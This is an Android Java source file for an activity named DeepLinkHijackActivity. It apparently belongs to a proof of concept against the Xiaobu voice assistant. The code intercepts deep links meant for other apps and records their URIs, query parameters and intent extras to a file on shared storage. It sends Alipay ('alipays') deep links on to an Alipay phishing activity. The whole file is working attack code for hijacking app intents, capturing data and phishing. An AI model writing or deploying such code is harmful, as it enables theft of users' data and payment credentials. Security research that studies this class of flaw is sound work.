package com.attacker.xiaobu;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import java.io.FileOutputStream;
import java.util.Set;

/**
 * DeepLink劫持 — 拦截小布发给其他App的DeepLink
 */
public class DeepLinkHijackActivity extends Activity {
    private static final String TAG = "DeepLinkHijack";
    private static final String OUT = "/sdcard/deeplink_hijack.txt";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        Uri data = intent.getData();
        Bundle extras = intent.getExtras();

        StringBuilder sb = new StringBuilder();
        sb.append("=== 截获DeepLink ===\n");
        sb.append("时间: ").append(new java.util.Date()).append("\n");
        sb.append("Action: ").append(intent.getAction()).append("\n");
        sb.append("URI: ").append(data != null ? data.toString() : "null").append("\n");
        if (data != null) {
            sb.append("  Scheme: ").append(data.getScheme()).append("\n");
            sb.append("  Host: ").append(data.getHost()).append("\n");
            sb.append("  Path: ").append(data.getPath()).append("\n");
            Set<String> params = data.getQueryParameterNames();
            if (params != null && !params.isEmpty()) {
                sb.append("  Query Params:\n");
                for (String key : params) {
                    sb.append("    ").append(key).append("=").append(data.getQueryParameter(key)).append("\n");
                }
            }
        }
        if (extras != null) {
            sb.append("Extras:\n");
            for (String key : extras.keySet()) {
                Object val = extras.get(key);
                if (val != null && val.toString().length() < 500) {
                    sb.append("  ").append(key).append("=").append(val).append("\n");
                }
            }
        }
        sb.append("---\n");

        String result = sb.toString();
        Log.i(TAG, result);

        // 追加到文件
        try {
            // 先读已有内容
            String existing = "";
            try { java.io.FileInputStream fis = new java.io.FileInputStream(OUT);
                  byte[] d = new byte[fis.available()]; fis.read(d); fis.close();
                  existing = new String(d, "UTF-8"); } catch (Exception e) {}
            FileOutputStream fos = new FileOutputStream(OUT);
            fos.write((existing + result).getBytes("UTF-8"));
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "write err: " + e.getMessage());
        }

        // 如果是支付宝deeplink, 转发到钓鱼页面
        if (data != null && "alipays".equals(data.getScheme())) {
            Intent phish = new Intent(this, AlipayPhishActivity.class);
            phish.setData(data);
            phish.putExtras(intent);
            startActivity(phish);
        }

        finish();
    }
}
